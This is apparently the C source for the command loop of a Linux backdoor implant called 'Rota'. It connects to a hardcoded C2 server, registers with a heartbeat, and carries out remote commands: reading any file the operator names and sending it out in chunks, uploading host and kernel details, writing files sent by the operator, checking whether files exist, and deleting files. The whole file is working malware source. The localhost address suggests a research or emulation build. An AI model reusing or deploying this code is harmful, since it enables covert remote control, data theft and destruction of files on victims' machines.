#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <signal.h>
#include <sys/shm.h>
#include <sys/stat.h>

#include "c2_loop.h"
#include "c2_commands.h"


void c2_loop() {

    int sleepy_time = 3; // default C2 sleep time
    int sock;
    int sock2;
    bool first_pkt = true;
    const char* server_name = "127.0.0.1";
    const int server_port = 1443;

    // setup sockets
    struct sockaddr_in server_address;
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    inet_pton(AF_INET, server_name, &server_address.sin_addr);
    server_address.sin_port = htons(server_port);


    // interactive c2 loop
    while (1) {

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "could not create socket\n");
        sleep(sleepy_time);
        c2_loop();
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        fprintf(stderr, "[!] Could not connect to server...\n");
        sleep(sleepy_time);
        c2_loop();
    }


    if (first_pkt == false) {
        // initial pkt registration
        char *initial_pkt = initial_rota_pkt();
        memcpy(&initial_pkt[14], &rota_c2_heartbeat, 4);
        send(sock, initial_pkt, 82, 0);

    } else {
        first_pkt = false;
        char *initial_pkt = initial_rota_pkt();
        send(sock, initial_pkt, 82, 0);
    }
    // interactive c2 loop
    #ifdef DEBUG
        printf("\n(%d) In c2 loop...\n", getpid());
    #endif
        // receive
        int n = 0;
        int len = 0;
        int maxlen = 65536;
        char buffer[maxlen];
        char *cmd_id = NULL;
        int payload_length;

        memset(buffer, 0, maxlen);


    while ((n = recv(sock, buffer, maxlen, 0)) > 0) {

        close(sock);
        shutdown(sock, 2);

        // create new socket to send response
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            fprintf(stderr, "could not create socket\n");
            sleep(sleepy_time);
            c2_loop();
        }

        if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
            fprintf(stderr, "[!] Could not connect to server...\n");
            sleep(sleepy_time);
            c2_loop();
        }

        maxlen -= n;
        len += n;

        cmd_id = parse_c2_cmdid(buffer);
        if (!cmd_id) {
            break;
        }
        // get payload length
        payload_length = parse_c2_payload_len(buffer);
        char *payload = parse_c2_payload(buffer, payload_length);

        #ifdef DEBUG
        printf("Timeout is %d\n", sleepy_time);
        printf("Payload is %s\n", payload);
        printf("Payload length is %d\n", payload_length);
        #endif

        if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run exiting!\n");
            #endif
            c2_exit(sock, sock2);
        }
        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
            c2_heartbeat(cmd_id, sock);
            break;

        }
        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 set timeout!\n");
            #endif

            // convert c2 sleep time
            int new_sleepy_time;
            int payload_sleep_time = atoi(payload);

            memcpy(&new_sleepy_time, &payload_sleep_time, sizeof(int));
            // update c2 sleep time
            c2_set_timeout(&sleepy_time, new_sleepy_time);
            char *msg= "sleepy time updated !";

            build_c2_response(msg, cmd_id, sock2);
        }
        else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run steal sensitive data\n");
            #endif
            bool result = c2_query_file(payload);
            if (result == true) {

                FILE *fd = fopen(payload, "r");
                struct stat stats;
                stat(payload, &stats);

                // malloc data w/ size of file
                char *data = (char *)malloc(stats.st_size);
                memset(data, 0, stats.st_size);

                fread(data, sizeof(payload[0]), stats.st_size, fd);
                fclose(fd);

                // chunking of large files
                if (stats.st_size > 65535) {
                    int remainder = (stats.st_size / 65535);
                    for (int i = 0; i < remainder; i++) {
                        char *tmp_buffer = (char *)malloc(65535);
                        memset(tmp_buffer, 0, 65535);
                        memcpy(tmp_buffer, &data[(i * 65535)], 65535);
                        build_c2_response(tmp_buffer, cmd_id, sock2);
                        free(tmp_buffer);
                    }
                } else {
                    build_c2_response(data, cmd_id, sock2);
                }
                free(data);
            } else {
                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock2);
            }

            memset(payload, 0, payload_length);
        }
        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run upload dev info\n");
            #endif

            char *uname_buffer = (char *)malloc(200);
            c2_upload_device_info(uname_buffer);
            // buffer is now populated as hostname-Linux-kernel-version
            build_c2_response(uname_buffer, cmd_id, sock2);
        }
        else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 upload file \n");
            #endif

            // TODO - break this out into a stub function
            FILE *fd = fopen("local_rota_file", "w+");
            int res = fwrite(payload, sizeof(payload[0]), payload_length, fd);
            fclose(fd);

            if (res  == payload_length) {
                char *msg = "successfully wrote entire file.";
                build_c2_response(msg, cmd_id, sock2);
            } else {
                char *msg = "Error writing file.";
                build_c2_response(msg, cmd_id, sock2);
            }

        }
        else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run query file\n");
            #endif

            // get fpath as the "payload" portion of the Rota packet.
            bool result = c2_query_file(payload);

            #ifdef DEBUG
            printf("file path %s results in %d\n", payload, result);
            #endif

            if (result == true) {
                char *msg = "file exists";
                build_c2_response(msg, cmd_id, sock2);
            } else {
                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock2);
            }

        }
        else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run delete file\n");
            #endif

            bool result = c2_query_file(payload);
            if (result == true) {

                int res = unlink(payload);
                if (res == 0) {

                    #ifdef DEBUG
                    printf("file deletion of %s successful", payload);
                    #endif

                    char *msg = "file deleted";
                    build_c2_response(msg, cmd_id, sock2);
                    break;
                } else {
                    #ifdef DEBUG
                    printf("file deletion of %s was unsuccessful", payload);
                    #endif
                    char *msg = "file could not be deleted";
                    build_c2_response(msg, cmd_id, sock2);
                }
            } else {
                    #ifdef DEBUG
                    printf("file %s does not exist", payload);
                    #endif
                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock2);
            }
        }
        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run Plugin 1\n");
            #endif

        } else {
            #ifdef DEBUG
            printf("Unknown command id %s\n", cmd_id);
            #endif
        }

        sleep(sleepy_time);
        free(payload);
        free(cmd_id);
        memset(buffer, 0, strlen(buffer));
        shutdown(sock, 2);
        close(sock);

        shutdown(sock2, 2);
        close(sock2);

    }

        memset(buffer, 0, strlen(buffer));
        sleep(sleepy_time);
        shutdown(sock, 2);
        shutdown(sock2, 2);
        close(sock);
        close(sock2);
    }
    shutdown(sock, 2);
    shutdown(sock2, 2);
    close(sock);
    close(sock2);
    exit(0);
}
